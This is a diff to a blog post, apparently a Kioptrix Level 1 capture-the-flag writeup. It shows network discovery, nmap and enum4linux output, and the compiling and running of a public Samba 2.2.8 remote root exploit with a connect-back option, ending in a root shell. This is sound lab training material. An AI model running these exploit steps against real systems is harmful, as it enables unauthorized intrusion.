@@ -1,7 +1,7 @@
 ---
-title: "Markdown Extra Components"
+title: "Kioptrix Lvl 1 Writeup"
 layout: post
-date: 2016-02-24 22:48
+date: 2017-05-04
 image: /assets/images/markdown.jpg
 headerImage: false
 tag:
@@ -15,7 +15,7 @@ description: Kioptrix lvl 1 Writeup
 ## Kioptrix
                     
 First let's begin with information gathering. We need to find which IP the kioptrix box has. I'm using a host only network with an IP of 192.168.8.0/24.
-<figure class="highlight"><pre><code class="nohighlight" data-lang="bash"><span style="color:black"><span style="color:red">root@kali</span>:~# netdiscover -r 192.168.8.0/24
+<figure class="highlight"><pre><code class="nohighlight" data-lang="bash"><span style="color:red">root@kali</span>:~# netdiscover -r 192.168.8.0/24
 
 
  Currently scanning: Finished!   |   Screen View: Unique Hosts                 
@@ -27,10 +27,10 @@ First let's begin with information gathering. We need to find which IP the kiopt
  192.168.8.1   00:50:56:c0:00:01      2     120  Unknown vendor              
  192.168.8.140 00:0c:29:69:72:b0      2     120  Unknown vendor              
  192.168.8.254 00:50:56:e8:60:ea      1      60  Unknown vendor
-</span></code></pre></figure>
+</code></pre></figure>
 
 The IP for the Kioptrix machine is 192.168.8.140. I'm using the tools <a href="https://github.com/codingo/reconnoitre">reconnoitre</a> and <a href="https://github.com/xapax/oscp">reconscan.py</a> to automate nmap scans, nitko, dirb, and enum4linux.
-<figure class="highlight"><pre><code class="nohighlight" data-lang="bash"><span class="gp"><span style="color:red">root@kali</span>:~#./reconnoitre.py -t 192.168.8.140 -o /root/Vulnhub --services
+<figure class="highlight"><pre><code class="nohighlight" data-lang="bash"><span style="color:red">root@kali</span>:~#./reconnoitre.py -t 192.168.8.140 -o /root/Vulnhub --services
 
 # Nmap 7.40 scan initiated Thu Jun 29 02:34:23 2017 as: nmap -vv -Pn -sS -A -sC -p- -T 3 -script-args=unsafe=1 -n -oN /root/Vulnhub/192.168.8.140/scans/192.168.8.140.nmap -oX /root/Vulnhub/192.168.8.140/scans/192.168.8.140_nmap_scan_import.xml 192.168.8.140
 Nmap scan report for 192.168.8.140
@@ -131,11 +131,11 @@ HOP RTT     ADDRESS
 Read data files from: /usr/bin/../share/nmap
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Thu Jun 29 02:36:11 2017 -- 1 IP address (1 host up) scanned in 107.87 seconds
-</span></code></pre></figure>
+</code></pre></figure>
     
-                    <p>Port 80 was open, but I did not find anything interesting on there.  I moved on to enumerate port 139 with enum4linux and I was able to find the service version for samba.</p>
+Port 80 was open, but I did not find anything interesting on there.  I moved on to enumerate port 139 with enum4linux and I was able to find the service version for samba.
 
-                    <figure class="highlight"><pre><code class="nohighlight" data-lang="bash"><span class="gp"><span class="r">root@kali</span>:~/oscp# 
+<figure class="highlight"><pre><code class="nohighlight" data-lang="bash"><span style="color:red">root@kali</span>:~/oscp# 
  ======================================= 
 |    OS information on 192.168.8.140    |
  ======================================= 
@@ -146,20 +146,20 @@ OS and Service detection performed. Please report any incorrect results at https
     os version      :   4.5
     server type     :   0x9a03
 
-</span></code></pre></figure>
+</code></pre></figure>
                     
-                    <p>I checked searchsploit for Samba exploits and found one.  I copied it to /root, compiled and executed it.  It worked and resulted in a root shell.</p>
+I checked searchsploit for Samba exploits and found one.  I copied it to /root, compiled and executed it.  It worked and resulted in a root shell.
 
-                    <figure class="highlight"><pre><code class="nohighlight" data-lang="bash"><span class="gp"><span class="r">root@kali</span>:~# searchsploit -m 10
+<figure class="highlight"><pre><code class="nohighlight" data-lang="bash"><span style="color:red">root@kali</span>:~# searchsploit -m 10
 Exploit: Samba 2.2.8 - Remote Code Execution
     URL: https://www.exploit-db.com/exploits/10/
    Path: /usr/share/exploitdb/platforms/linux/remote/10.c
 
 Copied to '/root/'
 
-<span class="r">root@kali</span>:~# gcc -o samba 10.c
-<span class="r">root@kali</span>:~# chmod 755 samba
-<span class="r">root@kali</span>:~# ./samba -b 0 -c 192.168.8.141 192.168.8.140
+<span style="color:red">root@kali</span>:~# gcc -o samba 10.c
+<span style="color:red">root@kali</span>:~# chmod 755 samba
+<span style="color:red">root@kali</span>:~# ./samba -b 0 -c 192.168.8.141 192.168.8.140
 samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
 --------------------------------------------------------------
 + Bruteforce mode. (Linux)
@@ -173,6 +173,4 @@ ls
 whoami
 root
 
-</span></code></pre></figure>
-
-
+</code></pre></figure>
